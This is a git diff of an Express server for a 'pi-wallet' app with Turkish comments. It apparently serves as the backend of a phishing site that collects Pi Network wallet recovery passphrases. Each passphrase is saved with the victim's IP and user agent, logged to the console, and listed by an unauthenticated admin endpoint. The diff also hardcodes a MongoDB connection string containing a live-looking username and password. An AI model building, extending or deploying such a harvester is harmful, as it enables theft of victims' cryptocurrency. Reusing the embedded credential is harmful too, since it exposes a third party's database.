@@ -1,30 +1,35 @@
 const express = require('express');
 const path = require('path');
+const { MongoClient, ServerApiVersion } = require('mongodb');
 const mongoose = require('mongoose');
 const dotenv = require('dotenv');
 const Passphrase = require('./models/Passphrase');
 
 dotenv.config();
+
 const app = express();
 
-// MongoDB bağlantısı
-mongoose.connect(process.env.MONGODB_URI, {
+// MongoDB bağlantı ayarları
+const uri = "mongodb+srv://develophasan:Vkm79dHv9pQfUzgq@cluster0.dbj9u.mongodb.net/pi-wallet?retryWrites=true&w=majority&appName=Cluster0";
+
+mongoose.connect(uri, {
+  serverApi: {
+    version: ServerApiVersion.v1,
+    strict: true,
+    deprecationErrors: true
+  },
   dbName: 'pi-wallet',
-  serverSelectionTimeoutMS: 5000,
-  socketTimeoutMS: 45000,
-  family: 4
+  connectTimeoutMS: 30000,
+  socketTimeoutMS: 60000
 })
-.then(() => console.log('MongoDB connected successfully'))
+.then(() => {
+  console.log("MongoDB bağlantısı başarılı!");
+})
 .catch(err => {
-  console.error('MongoDB connection error details:', {
-    message: err.message,
-    code: err.code,
-    name: err.name,
-    stack: err.stack
-  });
+  console.error('MongoDB bağlantı hatası:', err);
 });
 
-// CORS ve diğer middleware'ler
+// CORS ayarları
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -40,91 +45,59 @@ app.use((req, res, next) => {
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'build')));
 
-// Passphrase kaydetme endpoint'i
-app.post('/api/save-passphrase', async (req, res) => {
-  console.log('Received passphrase request:', {
-    ip: req.ip,
-    userAgent: req.get('User-Agent')
+// Hata yakalama middleware
+app.use((err, req, res, next) => {
+  console.error('Global error:', err);
+  res.status(500).json({ 
+    success: false, 
+    error: 'Internal server error',
+    details: process.env.NODE_ENV === 'development' ? err.message : undefined
   });
-  
-  const { passphrase } = req.body;
-  
+});
+
+// Passphrase kaydetme endpoint'i
+app.post('/api/save-passphrase', async (req, res, next) => {
   try {
-    console.log('Attempting to save passphrase...');
-    // Aynı passphrase'in daha önce kaydedilip kaydedilmediğini kontrol et
-    const existingPassphrase = await Passphrase.findOne({ passphrase });
+    console.log('İstek alındı:', req.body);
     
-    if (existingPassphrase) {
-      // Eğer aynı passphrase varsa, yeni bir uniqueId ile kaydet
-      const newPassphrase = new Passphrase({
-        passphrase,
-        ip: req.ip,
-        userAgent: req.get('User-Agent'),
-        uniqueId: Math.random().toString(36).substring(2) + Date.now().toString(36)
-      });
-      await newPassphrase.save();
-    } else {
-      // İlk kez kaydediliyorsa normal kaydet
-      const newPassphrase = new Passphrase({
-        passphrase,
-        ip: req.ip,
-        userAgent: req.get('User-Agent')
-      });
-      await newPassphrase.save();
+    const { passphrase } = req.body;
+    if (!passphrase) {
+      return res.status(400).json({ success: false, error: 'Passphrase gerekli' });
     }
 
-    res.json({ success: true });
-    console.log('Passphrase saved successfully');
-  } catch (error) {
-    console.error('Detailed save error:', {
-      message: error.message,
-      code: error.code,
-      name: error.name,
-      stack: error.stack
+    const newPassphrase = new Passphrase({
+      passphrase,
+      ip: req.ip,
+      userAgent: req.get('User-Agent'),
+      uniqueId: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
     });
+
+    await newPassphrase.save();
+    console.log('Passphrase kaydedildi:', newPassphrase._id);
     
-    // MongoDB duplicate key hatası
-    if (error.code === 11000) {
-      // Tekrar dene
-      try {
-        const newPassphrase = new Passphrase({
-          passphrase,
-          ip: req.ip,
-          userAgent: req.get('User-Agent'),
-          uniqueId: Math.random().toString(36).substring(2) + Date.now().toString(36)
-        });
-        await newPassphrase.save();
-        res.json({ success: true });
-      } catch (retryError) {
-        res.status(500).json({ 
-          success: false, 
-          error: 'Could not save passphrase after retry' 
-        });
-      }
-    } else {
-      res.status(500).json({ 
-        success: false, 
-        error: 'Could not save passphrase' 
-      });
-    }
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Kaydetme hatası:', error);
+    next(error);
   }
 });
 
-// Admin endpoint'i - passphrases'leri görüntülemek için
+// Admin endpoint'i
 app.get('/api/admin/passphrases', async (req, res) => {
   try {
-    const passphrases = await Passphrase.find().sort({ timestamp: -1 });
+    const passphrases = await Passphrase.find().sort({ createdAt: -1 });
     res.json(passphrases);
   } catch (error) {
-    res.status(500).json({ error: 'Could not fetch passphrases' });
+    res.status(500).json({ error: 'Veriler alınamadı' });
   }
 });
 
+// React router için catch-all route
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'build', 'index.html'));
 });
 
 const port = process.env.PORT || 3001;
 app.listen(port, () => {
-  console.log(`Server is running on port ${port}`);
+  console.log(`Sunucu ${port} portunda çalışıyor`);
 }); 
